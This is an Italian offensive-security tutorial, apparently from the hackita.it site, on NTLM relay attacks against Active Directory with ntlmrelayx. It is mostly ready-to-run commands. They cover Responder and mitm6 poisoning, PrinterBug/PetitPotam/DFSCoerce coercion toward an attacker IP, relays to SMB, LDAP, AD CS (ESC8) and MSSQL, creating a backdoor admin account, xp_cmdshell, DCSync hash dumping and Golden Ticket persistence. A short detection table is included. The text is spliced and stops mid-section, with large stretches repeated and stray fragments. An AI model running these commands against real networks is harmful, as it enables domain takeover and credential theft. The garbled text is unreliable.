proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
\
\--pfx-password 'CertPass123' --cert-outfile-path /tmp/ws01

# Cross-protocol — SMB in → LDAP out (rimuove MIC)

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support --remove-mic

# Interactive LDAP shell — comandi diretti su AD

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support -i
nc 127.0.0.1 11389   # → add\_user / add\_user\_to\_group / dump\_domain ...

```

---

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```

LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Tutto ciò che LDAP permette | + |
| Shadow Credentials | Write su msDS-KeyCredentialLink |
| Add computer account | MachineAccountQuota > 0 |
| RBCD completo | Write sul computer object target |

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

```

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

---

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```

IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo

```

---

## Decision tree — cosa usi in base a cosa trovi

```

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
\
\--pfx-password 'P\@ss123' --cert-outfile-path /tmp/dc01

# Cross-protocol SMB → LDAPS (rimuovi MIC)

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support --remove-mic --delegate-access

# Con IPv6/mitm6

sudo ntlmrelayx.py -6 -t ldaps\://10.10.10.5 -smb2support --delegate-access

```

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

```

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

---

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```

IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo

```

---

## Decision tree — cosa usi in base a cosa trovi

```

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

